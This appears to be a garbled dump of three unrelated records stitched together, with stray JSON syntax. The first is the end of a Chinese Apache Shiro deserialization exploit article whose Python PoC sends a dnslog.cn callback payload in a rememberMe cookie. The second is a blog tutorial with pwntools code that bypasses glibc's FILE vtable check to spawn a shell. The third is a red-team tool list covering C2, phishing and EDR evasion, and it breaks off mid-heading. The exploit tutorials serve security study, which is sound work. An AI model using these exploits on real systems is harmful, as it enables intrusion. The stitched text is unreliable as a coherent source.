dnslog\u7684poc    payload1 = encode_rememberme('http:\/\/ca4qki.dnslog.cn\/')\nprint(\"rememberMe={}\".format(payload1.decode()))\ncookie = {        \"rememberMe\": payload.decode()    }\nrequests.get(url=\"http:\/\/127.0.0.1:8080\/web_war\/\", cookies=cookie)\n0x05 \u4fee\u590d\n1.\u5347\u7ea7Shiro\u5230\u6700\u65b0\u7248\n2.\u5347\u7ea7\u5bf9\u5e94JDK\u7248\u672c\u5230 8u191\/7u201\/6u211\/11.0.1 \u4ee5\u4e0a\n3.WAF\u62e6\u622aCookie\u4e2d\u957f\u5ea6\u8fc7\u5927\u7684rememberMe\u503c\n0x06 \u603b\u7ed3\n\u672c\u6b21\u662f\u7528ysoserial\u76f4\u63a5\u751f\u6210\u5e8f\u5217\u5316\u5185\u5bb9\uff0c\u800c\u4e14\u4f7f\u7528CommonsCollections2\u8fd9\u4e2a\u5229\u7528\u94fe\uff0c\u53ea\u662f\u7b80\u5355\u7684\u76f4\u63a5\u5229\u7528\uff0c\u4f46\u662f\u5b9e\u9645\u5229\u7528\u60c5\u51b5\u5341\n\u5206\u590d\u6742\uff0c\u5173\u4e4ejava\u7684\u7248\u672c\u8fd8\u6709\u5404\u79cd\u7ec4\u4ef6\u7684\u7248\u672c\uff0c\u60f3\u8981\u4e00\u4e2a\u5b8c\u7f8e\u7684\u5229\u7528\u94fe\u8fd8\u662f\u5f97\u81ea\u5df1\u6539\u9020\uff0c\u51c6\u5907\u4e0b\u4e00\u7bc7\u6587\u7ae0\uff0c\u518d\u7814\u7a76\u5404\u79cd\u5229\u7528\u94fe\u7684\u60c5\u51b5\uff0c\u548c\u6539\u9020\u5404\u79cd\u5229\u7528\u94fe\u9002\u914d\n\u95ee\u9898\u3002\n\u672c\u6587\u6765\u81ea\uff1a\nhttps:\/\/blog.csdn.net\/god_zzz\/article\/details\/108391075\nhttps:\/\/blog.csdn.net\/qq_36119192\/article\/details\/98389956\nhttps:\/\/www.cnblogs.com\/sup3rman\/p\/13322898.html\n0x07 \u5c0ftrips\uff1a\n\u5982\u4f55\u641c\u7d22lib\u5305\u91cc\u9762\u7684\u4e1c\u897f\u5462\uff1f\n[]\n\u53cc\u51fbshift , \u8c03\u51fa\u5168\u5c40\u641c\u7d22\u6846\u5c31\u53ef\u4ee5\u641c\u7d22\u5230 jar\u5305\u91cc\u7684\u7c7b\u4e86\n\u9884\u89c8\u65f6\u6807\u7b7e\u4e0d\u53ef\u70b9\n[javascript]\nScan to Follow\n\u7ee7\u7eed\u6ed1\u52a8\u770b\u4e0b\u4e00\u4e2a\n(BUTTON) \u8f7b\u89e6\u9605\u8bfb\u539f\u6587\n\u58a8\u5b88\u79d1\u6280\n[2]Got It\n[javascript] Scan with Weixin to\nuse this Mini Program\n[3]Cancel [4]Allow\n[5]Cancel [6]Allow\n: \uff0c .   Video Mini Program Like \uff0c\u8f7b\u70b9\u4e24\u4e0b\u53d6\u6d88\u8d5e Wow \uff0c\u8f7b\u70b9\u4e24\u4e0b\u53d6\u6d88\u5728\u770b Share Comment"}
{"text":"[1]Dhaval Kapil\n[2]BLOG [3]ABOUT [4]PROJECTS [5]CONTACT\nFILE Structure Exploitation ('vtable' check bypass)\nJan 12, 2018 \u2022 Dhaval Kapil\nIntroduction\n\u2018FILE\u2019 structure exploitation is one of the common ways to gain control\nover execution flow. The attacker overwrites a \u2018FILE\u2019 pointer (say\nstdin, stdout, stderr or any other file handler opened by fopen()) to\npoint to his\/her own forged structure. This structure contains vtable,\nwhich is a pointer to a table which contains functions which are called\nwhen the original \u2018FILE\u2019 pointer is used to perform different\noperations (such as fread, fwrite, etc.). However, checks have recently\nbeen incorporated in libc that place a restriction on vtable to protect\nagainst most of the attacks.\n[6]Kees Cook has written an informative article about \u2018[7]Abusing the\nFILE structure\u2019. This technique will no longer work in the patched\nlibc. Another possible way to exploit the \u2018FILE\u2019 structure is to forge\nthe read, write pointers instead of the vtable. This technique is\nhighlighted by [8]Angelboy in his presentation: [9]Play with FILE\nStructure - Yet Another Binary Exploit Technique.\nIn this post, I\u2019ll be describing the protection mechanism introduced\nrecently in libc and a possible way to bypass it. We\u2019ll not only get\nRIP control, but also control over the the first three parameters in\nRDI, RSI and RDX respectively. I\u2019ll be only targeting the vtable\npointer.\nPrerequisites\nIt is assumed that the reader is familiar with the current FILE\nstructure and the common (though now obsolete) attack on vtable. The\nfollowing two resources (same as mentioned previously) are sufficient\nto get the necessary background:\n* [10]Abusing the FILE structure\n* [11]Play with FILE Structure - Yet Another Binary Exploit Technique\nProtection mechanism\nTwo new functions have been [12]added to protect against tampering with\nthe vtable pointer: IO_validate_vtable and _IO_vtable_check. Every\nvtable reference is first passed through IO_validate_vtable (which\ninternally uses _IO_vtable_check). In case tampering is detected, the\nprogram aborts, otherwise the corresponding vtable pointer is returned.\n\/*\nIO_validate_vtable\nSource: https:\/\/code.woboq.org\/userspace\/glibc\/libio\/libioP.h.html#IO_validate\n_vtable\n*\/\n\/* Perform vtable pointer validation.  If validation fails, terminate\nthe process.  *\/\nstatic inline const struct _IO_jump_t *\nIO_validate_vtable (const struct _IO_jump_t *vtable)\n{\n\/* Fast path: The vtable pointer is within the __libc_IO_vtables\nsection.  *\/\nuintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtable\ns;\nconst char *ptr = (const char *) vtable;\nuintptr_t offset = ptr - __start___libc_IO_vtables;\nif (__glibc_unlikely (offset >= section_length))\n\/* The vtable pointer is not in the expected section.  Use the\nslow path, which will terminate the process if necessary.  *\/\n_IO_vtable_check ();\nreturn vtable;\n}\nThe function checks whether the vtable pointer lies inside the\n__libc_IO_vtables section or not. If not, it further check the pointer\nby calling _IO_vtable_check. This section contains some vtables of the\ntype _IO_jump_t ([13]source). The original vtable is also part of it.\n\/*\n_IO_vtable_check\nSource: https:\/\/code.woboq.org\/userspace\/glibc\/libio\/vtables.c.html#_IO_vtable\n_check\n*\/\nvoid attribute_hidden\n_IO_vtable_check (void)\n{\n#ifdef SHARED\nvoid (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables);\n#ifdef PTR_DEMANGLE\nPTR_DEMANGLE (flag);\n#endif\nif (flag == &_IO_vtable_check)\nreturn;\n{\nDl_info di;\nstruct link_map *l;\nif (_dl_open_hook != NULL\n|| (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0\n&& l->l_ns != LM_ID_BASE))\nreturn;\n}\n#else \/* !SHARED *\/\nif (__dlopen != NULL)\nreturn;\n#endif\n__libc_fatal (\"Fatal error: glibc detected an invalid stdio handle\\n\");\n}\nAttack\nIn this attack, we will make the FILE\u2019s vtable point to some other\nplace (useful), which is already inside the __libc_IO_vtables section.\nThis will pass the security check. I came across this attack while\ngoing through a CTF [14]writeup. The _IO_str_jumps is also part of this\nsection ([15]source). It contains a pointer to the function\n_IO_str_overflow which is useful for our purpose.\n\/* Source: https:\/\/code.woboq.org\/userspace\/glibc\/libio\/strops.c.html#_IO_str_ov\nerflow\n*\/\n_IO_str_overflow (_IO_FILE *fp, int c)\n{\nint flush_only = c == EOF;\n_IO_size_t pos;\nif (fp->_flags & _IO_NO_WRITES)\nreturn flush_only ? 0 : EOF;\nif ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))\n{\nfp->_flags |= _IO_CURRENTLY_PUTTING;\nfp->_IO_write_ptr = fp->_IO_read_ptr;\nfp->_IO_read_ptr = fp->_IO_read_end;\n}\npos = fp->_IO_write_ptr - fp->_IO_write_base;\nif (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))\n{\nif (fp->_flags & _IO_USER_BUF) \/* not allowed to enlarge *\/\nreturn EOF;\nelse\n{\nchar *new_buf;\nchar *old_buf = fp->_IO_buf_base;\nsize_t old_blen = _IO_blen (fp);\n_IO_size_t new_size = 2 * old_blen + 100;\nif (new_size < old_blen)\nreturn EOF;\nnew_buf\n= (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);\n\/* ^ Getting RIP control !*\/\nWe shall overwrite the vtable in such a manner so that instead of\ncalling the regular \u2018FILE\u2019 associated function, _IO_str_overflow would\nbe called. Since we can already forge fp, we can control the execution\nflow, along with the first three parameters in this line:\n(char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);\nfp->_s._allocate_buffer is at a fixed offset within fp and new_size is\nbeing calculated from the members of fp. The offset can be calculated\nby reversing the binary or through gdb. In my case, the offset was\n0xe0, which is directly after vtable pointer. new_size is calculated as\nfollows:\n#define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)\nsize_t old_blen = _IO_blen (fp);\n_IO_size_t new_size = 2 * old_blen + 100;\nHence, we can craft any \u2018even\u2019 value for new_size by setting\nappropriate _IO_buf_end and _IO_buf_base. For instance, if we want\nnew_size to be equal to x, set _IO_buf_base = 0 and _IO_buf_end = (x -\n100)\/2. However, we also have to pass a check before arriving at the\nparticular call instruction:\nint flush_only = c == EOF;\npos = fp->_IO_write_ptr - fp->_IO_write_base;\nif (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))\nflush_only is 0, so we want pos >= _IO_blen(fp). This can be achieved\nby setting _IO_write_ptr = (x - 100)\/2 and _IO_write_base = 0.\nRegarding the second and third parameters, let\u2019s reverse the binary at\nassembly level and trace back the registers rsi and rdx before the call\ninstruction:\nmov     rdx, [rdi+28h]\nmov     rsi, rdx\nsub     rsi, [rdi+20h]\nrdi + 0x28 matches with fp->_IO_write_ptr. rdi + 0x20 matches with\n_IO_write_base. Note that we already have a restriction that\n_IO_write_ptr - _IO_write_base should be greater than or equal to (rdi\n- 100)\/2. Hence, we cannot have arbitrary values for rsi and rdx.\nNow, with this let\u2019s try our own exploit. Consider the vulnerable code:\n\/* gcc vuln.c -o vuln *\/\n#include <stdio.h>\n#include <unistd.h>\nchar fake_file[0x200];\nint main() {\nFILE *fp;\nputs(\"Leaking libc address of stdout:\");\nprintf(\"%p\\n\", stdout); \/\/ Emulating libc leak\nputs(\"Enter fake file structure\");\nread(0, fake_file, 0x200);\nfp = (FILE *)&fake_file;\nfclose(fp);\nreturn 0;\n}\n[16]Here is the link to the above mentioned code. You might want to\nwork with the same [17]binary and [18]libc that I used. I am running it\non Ubuntu 16.04.\nThe program first simulates a leak of an address in libc. It then takes\ninput in a global variable fake_file and points the file pointer fp to\nit. Next, it closes the file pointer using fclose(fp).\nThe first step towards developing the exploit is to realize the target\nthat we want to achieve. Namely, calling system(\"\/bin\/sh\"). I shall be\nusing [19]pwntools library. The binary comes with a libc leak, making\nit easier for us to calculate the address of system and the string\n\/bin\/sh within the libc.\nrip = libc_base + libc.symbols['system']\nrdi = libc_base + next(libc.search(\"\/bin\/sh\"))\nOur next step is to point vtable to some address, such that, fclose\nwill actually call _IO_str_overflow. I used gdb to find the relative\noffset of a pointer to _IO_str_overflow from _IO_file_jumps, which\napparently is 0xd8 for the provided libc. Now, if I point the vtable to\n0x10 bytes before it, fclose will call _IO_str_overflow (again from\ngdb).\nio_str_overflow_ptr_addr = libc_base + libc.symbols['_IO_file_jumps'] + 0xd8\n# Calculate the vtable by subtracting appropriate offset\nfake_vtable_addr = io_str_overflow_ptr_addr - 2*8\nNext, we can craft our fake \u2018FILE\u2019 structure by setting appropriate\nvtable and also other pointers so as to call rip with rdi as a\nparameter.\n# Craft file struct\nfile_struct = pack_file(_IO_buf_base = 0,\n_IO_buf_end = (rdi-100)\/2,\n_IO_write_ptr = (rdi-100)\/2,\n_IO_write_base = 0,\n_lock = bin.symbols['fake_file'] + 0x80)\n# vtable pointer\nfile_struct += p64(fake_vtable_addr)\n# (*((_IO_strfile *) fp)->_s._allocate_buffer)\nfile_struct += p64(rip)\nfile_struct = file_struct.ljust(0x100, \"\\x00\")\nNote that we also have to set fp->_lock to an address pointing to NULL\nto prevent fclose waiting on someone else for releasing the lock. The\ncomplete exploit can be downloaded [20]here.\nNote: Another possible function (instead of _IO_str_overflow) that one\ncould use is _IO_wstr_finish() as seen in this [21]post by Josh Wang.\nConclusion\nGiven that an attacker has control over a few fields of the \u2018FILE\u2019\nstructure(for rdi), the vtable pointer and 8 bytes after it (for rip),\nthe additional check on vtable offers not much protection.\nFind me on [22]Github and [23]Twitter\nPlease enable JavaScript to view the [24]comments.\n[25]Github logo [26]Twitter logo [27]Linkedin logo [28]Email logo\n[29]Google+ logo [30]Keybase logo [31]RSS logo\n[32]sitemap | [33]contact | [34]disclaimer\n\u00a9 2018 Dhaval Kapil. All rights reserved"}
{"text":"# Red Teaming Toolkit\n\nThis repository contains cutting-edge open-source security tools (OST) that will help you during adversary simulation and as information intended for threat hunter can make detection and prevention control easier. The list of tools below that could be potentially misused by threat actors such as APT and Human-Operated Ransomware (HumOR). If you want to contribute to this list send me a pull request.\n\n---\n\n## Table of Contents\n - [Reconnaissance](#Reconnaissance)\n - [Initial Access](#Initial-Access)\n - [Delivery](#Delivery)\n - [Situational Awareness](#situational-awareness)\n - [Credential Dumping](#credential-dumping)\n - [Privilege Escalation](#privilege-escalation)\n - [Defense Evasion](#defense-evasion)\n - [Persistence](#persistence)\n - [Lateral Movement](#lateral-movement)\n - [Exfiltration](#exfiltration)\n - [Miscellaneous](#miscellaneous)\n\n---\n\n## Reconnaissance\n|Name|Description|URL|\n|-----|-----------|----|\n|RustScan|The Modern Port Scanner. Find ports quickly (3 seconds at its fastest). Run scripts through our scripting engine (Python, Lua, Shell supported).|https:\/\/github.com\/RustScan\/RustScan|\n|Amass|In-depth Attack Surface Mapping and Asset Discovery|https:\/\/github.com\/OWASP\/Amass|\n|gitleaks|Gitleaks is a SAST tool for detecting hardcoded secrets like passwords, api keys, and tokens in git repos.|https:\/\/github.com\/zricethezav\/gitleaks|\n|S3Scanner|Scan for open S3 buckets and dump the contents|https:\/\/github.com\/sa7mon\/S3Scanner|\n|cloud_enum|Multi-cloud OSINT tool. Enumerate public resources in AWS, Azure, and Google Cloud.|https:\/\/github.com\/initstring\/cloud_enum|\n|Recon-ng|Open Source Intelligence gathering tool aimed at reducing the time spent harvesting information from open sources.|https:\/\/github.com\/lanmaster53\/recon-ng|\n|buster|An advanced tool for email reconnaissance|https:\/\/github.com\/sham00n\/buster|\n|linkedin2username|OSINT Tool: Generate username lists for companies on LinkedIn|https:\/\/github.com\/initstring\/linkedin2username|\n|WitnessMe|Web Inventory tool, takes screenshots of webpages using Pyppeteer (headless Chrome\/Chromium) and provides some extra bells & whistles to make life easier.|https:\/\/github.com\/byt3bl33d3r\/WitnessMe|\n|pagodo|pagodo (Passive Google Dork) - Automate Google Hacking Database scraping and searching|https:\/\/github.com\/opsdisk\/pagodo|\n|AttackSurfaceMapper|AttackSurfaceMapper is a tool that aims to automate the reconnaissance process.|https:\/\/github.com\/superhedgy\/AttackSurfaceMapper|\n|SpiderFoot|SpiderFoot is an open source intelligence (OSINT) automation tool. It integrates with just about every data source available and utilises a range of methods for data analysis, making that data easy to navigate.|https:\/\/github.com\/smicallef\/spiderfoot|\n|dnscan|dnscan is a python wordlist-based DNS subdomain scanner.|https:\/\/github.com\/rbsec\/dnscan|\n|spoofcheck|A program that checks if a domain can be spoofed from. The program checks SPF and DMARC records for weak configurations that allow spoofing.|https:\/\/github.com\/BishopFox\/spoofcheck|\n|LinkedInt|LinkedIn Recon Tool|https:\/\/github.com\/vysecurity\/LinkedInt|\n\n## Initial Access\n\n### Brute Force\n|Name|Description|URL|\n|-----|-----------|----|\n|SprayingToolkit|Scripts to make password spraying attacks against Lync\/S4B, OWA & O365 a lot quicker, less painful and more efficient|https:\/\/github.com\/byt3bl33d3r\/SprayingToolkit|\n|o365recon|Retrieve information via O365 with a valid cred|https:\/\/github.com\/nyxgeek\/o365recon|\n|CredMaster|Refactored & improved CredKing password spraying tool, uses FireProx APIs to rotate IP addresses, stay anonymous, and beat throttling|https:\/\/github.com\/knavesec\/CredMaster|\n\n### Payload Development\n|Name|Description|URL|\n|-----|-----------|----|\n|Ivy|Ivy is a payload creation framework for the execution of arbitrary VBA (macro) source code directly in memory.|https:\/\/github.com\/optiv\/Ivy|\n|PEzor|Open-Source PE Packer|https:\/\/github.com\/phra\/PEzor|\n|GadgetToJScript|A tool for generating .NET serialized gadgets that can trigger .NET assembly load\/execution when deserialized using BinaryFormatter from JS\/VBS\/VBA scripts.|https:\/\/github.com\/med0x2e\/GadgetToJScript|\n|ScareCrow|Payload creation framework designed around EDR bypass.|https:\/\/github.com\/optiv\/ScareCrow|\n|Donut|Donut is a position-independent code that enables in-memory execution of VBScript, JScript, EXE, DLL files and dotNET assemblies. |https:\/\/github.com\/TheWover\/donut|\n|Mystikal|macOS Initial Access Payload Generator|https:\/\/github.com\/D00MFist\/Mystikal|\n|charlotte|c++ fully undetected shellcode launcher ;)|https:\/\/github.com\/9emin1\/charlotte|\n|InvisibilityCloak|Proof-of-concept obfuscation toolkit for C# post-exploitation tools. This will perform the below actions for a C# visual studio project.|https:\/\/github.com\/xforcered\/InvisibilityCloak|\n|Dendrobate|Dendrobate is a framework that facilitates the development of payloads that hook unmanaged code through managed .NET code.|https:\/\/github.com\/FuzzySecurity\/Dendrobate|\n|Offensive VBA and XLS Entanglement|This repo provides examples of how VBA can be used for offensive purposes beyond a simple dropper or shell injector. As we develop more use cases, the repo will be updated.|https:\/\/github.com\/BC-SECURITY\/Offensive-VBA-and-XLS-Entanglement|\n|xlsGen|Tiny Excel BIFF8 Generator, to Embedded 4.0 Macros in *.xls|https:\/\/github.com\/aaaddress1\/xlsGen|\n|darkarmour|Windows AV Evasion|https:\/\/github.com\/bats3c\/darkarmour|\n|InlineWhispers|Tool for working with Direct System Calls in Cobalt Strike's Beacon Object Files (BOF)|https:\/\/github.com\/outflanknl\/InlineWhispers|\n|EvilClippy|A cross-platform assistant for creating malicious MS Office documents. Can hide VBA macros, stomp VBA code (via P-Code) and confuse macro analysis tools. Runs on Linux, OSX and Windows.|https:\/\/github.com\/outflanknl\/EvilClippy|\n|OfficePurge|VBA purge your Office documents with OfficePurge. VBA purging removes P-code from module streams within Office documents.|https:\/\/github.com\/fireeye\/OfficePurge|\n|ThreatCheck|Identifies the bytes that Microsoft Defender \/ AMSI Consumer flags on.|https:\/\/github.com\/rasta-mouse\/ThreatCheck|\n|CrossC2|Generate CobaltStrike's cross-platform payload|https:\/\/github.com\/gloxec\/CrossC2|\n|Ruler|Ruler is a tool that allows you to interact with Exchange servers remotely, through either the MAPI\/HTTP or RPC\/HTTP protocol.|https:\/\/github.com\/sensepost\/ruler|\n|DueDLLigence|Shellcode runner framework for application whitelisting bypasses and DLL side-loading. The shellcode included in this project spawns calc.exe.|https:\/\/github.com\/fireeye\/DueDLLigence|\n|RuralBishop|RuralBishop is practically a carbon copy of UrbanBishop by b33f, but all P\/Invoke calls have been replaced with D\/Invoke.|https:\/\/github.com\/rasta-mouse\/RuralBishop|\n|TikiTorch|TikiTorch was named in homage to CACTUSTORCH by Vincent Yiu. The basic concept of CACTUSTORCH is that it spawns a new process, allocates a region of memory, then uses CreateRemoteThread to run the desired shellcode within that target process. Both the process and shellcode are specified by the user.|https:\/\/github.com\/rasta-mouse\/TikiTorch|\n|SharpShooter|SharpShooter is a payload creation framework for the retrieval and execution of arbitrary CSharp source code. SharpShooter is capable of creating payloads in a variety of formats, including HTA, JS, VBS and WSF.|https:\/\/github.com\/mdsecactivebreach\/SharpShooter|\n|SharpSploit|SharpSploit is a .NET post-exploitation library written in C#|https:\/\/github.com\/cobbr\/SharpSploit|\n|MSBuildAPICaller|MSBuild Without MSBuild.exe|https:\/\/github.com\/rvrsh3ll\/MSBuildAPICaller|\n|macro_pack|macro_pack is a tool by @EmericNasi used to automatize obfuscation and generation of MS Office documents, VB scripts, and other formats for pentest, demo, and social engineering assessments.|https:\/\/github.com\/sevagas\/macro_pack|\n|inceptor|Template-Driven AV\/EDR Evasion Framework|https:\/\/github.com\/klezVirus\/inceptor|\n|mortar|evasion technique to defeat and divert detection and prevention of security products (AV\/EDR\/XDR)|https:\/\/github.com\/0xsp-SRD\/mortar|\n|ProtectMyTooling|Multi-Packer wrapper letting us daisy-chain various packers, obfuscators and other Red Team oriented weaponry. Featured with artifacts watermarking, IOCs collection & PE Backdooring. You feed it with your implant, it does a lot of sneaky things and spits out obfuscated executable.|https:\/\/github.com\/mgeeky\/ProtectMyTooling|\n|Freeze|Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods|https:\/\/github.com\/optiv\/Freeze|\n\n## Delivery\n### Phishing\n|Name|Description|URL|\n|-----|-----------|----|\n|o365-attack-toolkit|A toolkit to attack Office365|https:\/\/github.com\/mdsecactivebreach\/o365-attack-toolkit|\n|Evilginx2|Evilginx2 is a man-in-the-middle attack framework used for phishing credentials and session cookies of any web service.|https:\/\/github.com\/kgretzky\/evilginx2|\n|Gophish|Gophish is an open-source phishing toolkit designed for businesses and penetration testers. It provides the ability to quickly and easily setup and execute phishing engagements and security awareness training.|https:\/\/github.com\/gophish\/gophish|\n|PwnAuth|PwnAuth a web application framework for launching and managing OAuth abuse campaigns.|https:\/\/github.com\/fireeye\/PwnAuth|\n|Modlishka|Modlishka is a flexible and powerful reverse proxy, that will take your ethical phishing campaigns to the next level.|https:\/\/github.com\/drk1wi\/Modlishka|\n\n### Watering Hole Attack\n|Name|Description|URL|\n|-----|-----------|----|\n|BeEF|BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser|https:\/\/github.com\/beefproject\/beef|\n\n## Command and Control\n\n### Remote Access Tools (RAT)\n|Name|Description|URL|\n|-----|-----------|----|\n|Cobalt Strike|Cobalt Strike is software for Adversary Simulations and Red Team Operations.|https:\/\/cobaltstrike.com\/|\n|Brute Ratel C4|Brute Ratel is the most advanced Red Team & Adversary Simulation Software in the current C2 Market.|https:\/\/bruteratel.com\/|\n|Empire|Empire 5 is a post-exploitation framework that includes a pure-PowerShell Windows agent, and compatibility with Python 3.x Linux\/OS X agents.|https:\/\/github.com\/BC-SECURITY\/Empire|\n|PoshC2|PoshC2 is a proxy aware C2 framework used to aid penetration testers with red teaming, post-exploitation and lateral movement.|https:\/\/github.com\/nettitude\/PoshC2|\n|Koadic|Koadic C3 COM Command & Control - JScript RAT|https:\/\/github.com\/zerosum0x0\/koadic|\n|merlin|Merlin is a cross-platform post-exploitation Command & Control server and agent written in Go.|https:\/\/github.com\/Ne0nd0g\/merlin|\n|Mythic|A cross-platform, post-exploit, red teaming framework built with python3, docker, docker-compose, and a web browser UI.|https:\/\/github.com\/its-a-feature\/Mythic|\n|Covenant|Covenant is a .NET command and control framework that aims to highlight the attack surface of .NET, make the use of offensive .NET tradecraft easier, and serve as a collaborative command and control platform for red teamers.|https:\/\/github.com\/cobbr\/Covenant|\n|shad0w|A post exploitation framework designed to operate covertly on heavily monitored environments|https:\/\/github.com\/bats3c\/shad0w|\n|Sliver|Sliver is a general purpose cross-platform implant framework that supports C2 over Mutual-TLS, HTTP(S), and DNS.|https:\/\/github.com\/BishopFox\/sliver|\n|SILENTTRINITY|An asynchronous, collaborative post-exploitation agent powered by Python and .NET's DLR|https:\/\/github.com\/byt3bl33d3r\/SILENTTRINITY|\n|Pupy|Pupy is an opensource, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool mainly written in python|https:\/\/github.com\/n1nj4sec\/pupy|\n|Havoc|Havoc is a modern and malleable post-exploitation command and control framework, created by @C5pider.|https:\/\/github.com\/HavocFramework\/Havoc|\n|NimPlant|A light first-stage C2 implant written in Nim and Python|https:\/\/github.com\/chvancooten\/NimPlant|\n|SharpC2|SharpC2 is a Command & Control (C2) framework written in C#. It consists of an ASP.NET Core Team Server, a .NET Framework implant, and a .NET MAUI client.|https:\/\/github.com\/rasta-mouse\/SharpC2|\n\n### Staging\n|Name|Description|URL|\n|-----|-----------|----|\n|pwndrop|Self-deployable file hosting service for red teamers, allowing to easily upload and share payloads over HTTP and WebDAV.|https:\/\/github.com\/kgretzky\/pwndrop|\n|C2concealer|A command line tool that generates randomized C2 malleable profiles for use in Cobalt Strike.|https:\/\/github.com\/FortyNorthSecurity\/C2concealer|\n|FindFrontableDomains|Search for potential frontable domains|https:\/\/github.com\/rvrsh3ll\/FindFrontableDomains|\n|Domain Hunter|Checks expired domains for categorization\/reputation and Archive.org history to determine good candidates for phishing and C2 domain names|https:\/\/github.com\/threatexpress\/domainhunter|\n|RedWarden|Flexible CobaltStrike Malleable Redirector|https:\/\/github.com\/mgeeky\/RedWarden|\n|AzureC2Relay|AzureC2Relay is an Azure Function that validates and relays Cobalt Strike beacon traffic by verifying the incoming requests based on a Cobalt Strike Malleable C2 profile.|https:\/\/github.com\/Flangvik\/AzureC2Relay|\n|C3|C3 (Custom Command and Control) is a tool that allows Red Teams to rapidly develop and utilise esoteric command and control channels (C2).|https:\/\/github.com\/FSecureLABS\/C3|\n|Chameleon|A tool for evading Proxy categorisation|https:\/\/github.com\/mdsecactivebreach\/Chameleon|\n|Cobalt Strike Malleable C2 Design and Reference Guide|Cobalt Strike Malleable C2 Design and Reference Guide|https:\/\/github.com\/threatexpress\/malleable-c2\/|\n|redirect.rules|Quick and dirty dynamic redirect.rules generator|https:\/\/github.com\/0xZDH\/redirect.rules|\n|CobaltBus|Cobalt Strike External C2 Integration With Azure Servicebus, C2 traffic via Azure Servicebus|https:\/\/github.com\/Flangvik\/CobaltBus|\n|SourcePoint|SourcePoint is a C2 profile generator for Cobalt Strike command and control servers designed to ensure evasion.|https:\/\/github.com\/Tylous\/SourcePoint|\n|RedGuard|RedGuard is a C2 front flow control tool,Can avoid Blue Teams,AVs,EDRs check.|https:\/\/github.com\/wikiZ\/RedGuard|\n|skyhook|A round-trip obfuscated HTTP file transfer setup built to bypass IDS detections.|https:\/\/github.com\/blackhillsinfosec\/skyhook|\n\n### Log Aggregation\n|Name|Description|URL|\n|-----|-----------|----|\n|RedELK|Red Team's SIEM - tool for Red Teams used for tracking and alarming about Blue Team activities as well as better usability in long term operations.|https:\/\/github.com\/outflanknl\/RedELK|\n|Elastic for Red Teaming|Repository of resources for configuring a Red Team SIEM using Elastic.|https:\/\/github.com\/SecurityRiskAdvisors\/RedTeamSIEM|\n|RedEye|RedEye is a visual analytic tool supporting Red & Blue Team operations|https:\/\/github.com\/cisagov\/RedEye|\n\n## Situational Awareness\n### Host Situational Awareness\n|Name|Description|URL|\n|-----|-----------|----|\n|AggressiveProxy|AggressiveProxy is a combination of a .NET 3.5 binary (LetMeOutSharp) and a Cobalt Strike aggressor script (AggressiveProxy.cna). Once LetMeOutSharp is executed on a workstation, it will try to enumerate all available proxy configurations and try to communicate with the Cobalt Strike server over HTTP(s) using the identified proxy configurations.|https:\/\/github.com\/EncodeGroup\/AggressiveProxy|\n|Gopher|C# tool to discover low hanging fruits|https:\/\/github.com\/EncodeGroup\/Gopher|\n|SharpEDRChecker|Checks running processes, process metadata, Dlls loaded into your current process and the each DLLs metadata, common install directories, installed services and each service binaries metadata, installed drivers and each drivers metadata, all for the presence of known defensive products such as AV's, EDR's and logging tools.|https:\/\/github.com\/PwnDexter\/SharpEDRChecker|\n|Situational Awareness BOF|This Repo intends to serve two purposes. First it provides a nice set of basic situational awareness commands implemented in BOF.|https:\/\/github.com\/trustedsec\/CS-Situational-Awareness-BOF|\n|Seatbelt|Seatbelt is a C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives.|https:\/\/github.com\/GhostPack\/Seatbelt|\n|SauronEye|SauronEye is a search tool built to aid red teams in finding files containing specific keywords.|https:\/\/github.com\/vivami\/SauronEye|\n|SharpShares|Multithreaded C# .NET Assembly to enumerate accessible network shares in a domain|https:\/\/github.com\/mitchmoser\/SharpShares|\n|SharpAppLocker|C# port of the Get-AppLockerPolicy PowerShell cmdlet with extended features. Includes the ability to filter and search for a specific type of rules and actions.|https:\/\/github.com\/Flangvik\/SharpAppLocker\/|\n|SharpPrinter|Printer is a modified and console version of ListNetworks|https:\/\/github.com\/rvrsh3ll\/SharpPrinter|\n\n\n### Domain Situational Awareness\n|Name|Description|URL|\n|-----|-----------|----|\n|StandIn|StandIn is a small AD post-compromise toolkit. StandIn came about because recently at xforcered we needed a .NET native solution to perform resource based constrained delegation.|https:\/\/github.com\/FuzzySecurity\/StandIn|\n|Recon-AD|An AD recon tool based on ADSI and reflective DLL\u2019s|https:\/\/github.com\/outflanknl\/Recon-AD|\n|BloodHound|Six Degrees of Domain Admin|https:\/\/github.com\/BloodHoundAD\/BloodHound|\n|PSPKIAudit|PowerShell toolkit for auditing Active Directory Certificate Services (AD CS).|https:\/\/github.com\/GhostPack\/PSPKIAudit|\n|SharpView|C# implementation of harmj0y's PowerView|https:\/\/github.com\/tevora-threat\/SharpView|\n|Rubeus|Rubeus is a C# toolset for raw Kerberos interaction and abuses. It is heavily adapted from Benjamin Delpy's Kekeo project (CC BY-NC-SA 4.0 license) and Vincent LE TOUX's MakeMeEnterpriseAdmin project (GPL v3.0 license). |https:\/\/github.com\/GhostPack\/Rubeus|\n|nanorobeus|A minimalistic tool for managing Kerberos tickets. Supports redteam frameworks|https:\/\/github.com\/wavvs\/nanorobeus|\n|Grouper|A PowerShell script for helping to find vulnerable settings in AD Group Policy. (deprecated, use Grouper2 instead!)|https:\/\/github.com\/l0ss\/Grouper|\n|ImproHound|Identify the attack paths in BloodHound breaking your AD tiering|https:\/\/github.com\/improsec\/ImproHound|\n|ADRecon|ADRecon is a tool which gathers information about the Active Directory and generates a report which can provide a holistic picture of the current state of the target AD environment.|https:\/\/github.com\/adrecon\/ADRecon|\n|ADCSPwn|A tool to escalate privileges in an active directory network by coercing authenticate from machine accounts (Petitpotam) and relaying to the certificate service.|https:\/\/github.com\/bats3c\/ADCSPwn|\n\n\n## Credential 